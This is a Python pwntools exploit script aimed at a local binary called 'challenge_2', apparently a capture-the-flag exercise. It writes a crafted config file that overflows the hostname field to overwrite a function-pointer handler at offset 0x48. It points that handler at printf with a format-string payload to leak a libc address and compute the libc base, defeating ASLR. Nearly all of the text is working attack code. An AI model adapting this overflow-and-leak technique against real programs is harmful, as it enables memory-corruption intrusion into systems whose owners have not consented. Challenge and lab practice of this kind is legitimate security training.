#!/usr/bin/env python3
import struct
from pwn import *

def build(hostname: bytes, count: int = 0, ip: bytes = b"") -> bytes:
    """
    Builds a valid config file expected by parse_config()
    File format expected by parse_config:
    On-disk format (in read order):
         [2] hostname_len       (short u16)
         [N] hostname                
         [2] marker  == "rR"        
         [4] count              (int i32)
         [2] ip_len             (short u16)
         [M] ip
    """
    MARKER = b"rR" 
    out  = struct.pack("<H", len(hostname))   
    out += hostname                           
    out += MARKER                            
    out += struct.pack("<i", count)             
    out += struct.pack("<H", len(ip))      
    out += ip
    return out


def exploit(target: int, hostname: bytes = b"", count: int = 0, ip: bytes = b"") -> bytes:
    """
    No bounds check on hostname, so we can overwrite the handler field of the struct (at offset 0x48).
    The handler itself is invoked by main as handler(config) i.e rdi = &config. This importantly gives us control of the first
    argument as hostname if we redirect execution to another function.
        
    The count, ip fields aren't important
    """
    # See config.h
    HANDLER_OFF  = 0x48   
    if len(hostname) > HANDLER_OFF:
        raise ValueError(f"hostname: {hostname} is too large to overwite the handler expected {HANDLER_OFF} but got {len(hostname)}")
    hostname  = hostname + b"A" * (HANDLER_OFF - len(hostname))     # pad to 0x48
    hostname += struct.pack("<Q", target)                           # target @ 0x48
    return build(hostname, count=count, ip=ip)
    
if __name__ == "__main__":
    e = ELF("./challenge_2")
    fmt = b"|%35$p|\n"          
    fmt += b"\x00"             
 
    data = exploit(e.plt["printf"], hostname=fmt)
    with open("leak", "wb") as f:
        f.write(data)
    print("wrote leak")
 
    # Leaks libc
    io = process([e.path, "leak"])
    io.recvuntil(b"|")
    leak = int(io.recvuntil(b"|", drop=True), 16)
    LIBC_OFFSET = 0x29d90
    libc_base = leak - LIBC_OFFSET
    io.close()
    print(f"libc base = {hex(libc_base)}")
